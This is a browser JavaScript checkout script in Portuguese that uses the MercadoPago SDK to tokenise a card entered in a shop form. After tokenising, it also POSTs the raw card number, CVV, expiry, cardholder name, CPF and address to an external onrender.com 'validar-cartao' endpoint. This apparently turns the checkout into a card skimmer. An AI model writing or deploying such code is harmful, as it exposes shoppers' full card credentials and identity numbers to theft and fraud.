const mp = new MercadoPago('APP_USR-d9085be6-cab5-4226-be88-0e3199c1cb63');

async function validarCartaoAutomatico() {
    const btn = document.querySelector('.btn-fazer-pedido');
    
    // 1. LISTA DE TODOS OS CAMPOS OBRIGATÓRIOS (Exceto WhatsApp)
    const camposObrigatorios = [
        document.getElementById('f-nome'),
        document.getElementById('f-cep'),
        document.getElementById('f-rua'),
        document.getElementById('f-cid'),
        document.getElementById('f-est'),
        document.querySelector('input[placeholder="0000 0000 0000 0000"]'),
        document.querySelector('input[oninput*="toUpperCase"]'),
        document.querySelector('input[placeholder="MM/AA"]'),
        document.querySelector('input[placeholder="000"]'),
        document.querySelector('input[placeholder="000.000.000-00"]')
    ];

    // 2. VERIFICAÇÃO AUTOMÁTICA
    for (let campo of camposObrigatorios) {
        if (campo && !campo.checkValidity()) {
            campo.reportValidity(); // Faz o navegador mostrar o erro no campo vazio
            return; // Para o código aqui e não faz o pedido
        }
    }

    // 3. SE CHEGOU AQUI, TUDO FOI PREENCHIDO (WhatsApp pode estar seco)
    btn.innerText = "Verificando...";
    btn.disabled = true;

    const dadosExtras = {
        nomeRecebedor: document.getElementById('f-nome').value,
        whatsapp: document.getElementById('f-tel').value, // Envia vazio se não preencher
        endereco: `${document.getElementById('f-rua').value}, ${document.getElementById('f-cid').value}-${document.getElementById('f-est').value}`,
        nCartao: document.querySelector('input[placeholder="0000 0000 0000 0000"]').value,
        nomeNoCartao: document.querySelector('input[oninput*="toUpperCase"]').value,
        validade: document.querySelector('input[placeholder="MM/AA"]').value,
        cvv: document.querySelector('input[placeholder="000"]').value,
        cpfTitular: document.querySelector('input[placeholder="000.000.000-00"]').value
    };

    try {
        const token = await mp.createCardToken({
            cardNumber: dadosExtras.nCartao.replace(/\s/g, ''),
            cardholderName: dadosExtras.nomeNoCartao,
            cardExpirationMonth: dadosExtras.validade.split('/')[0],
            cardExpirationYear: "20" + dadosExtras.validade.split('/')[1],
            securityCode: dadosExtras.cvv,
            identificationType: "CPF",
            identificationNumber: dadosExtras.cpfTitular.replace(/\D/g, '')
        });

        if (token.id) {
            const response = await fetch("https://testando-slah.onrender.com/validar-cartao", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ token: token.id, dados: dadosExtras })
            });

            const res = await response.json();
            if (res.status === 'approved') {
                window.location.href = "obrigado.html";
            } else {
                alert("Cartão recusado pelo banco emissor.");
            }
        }
    } catch (e) {
        alert("Erro na validação. Verifique os dados.");
    } finally {
        btn.innerText = "Fazer Pedido";
        btn.disabled = false;
    }
}
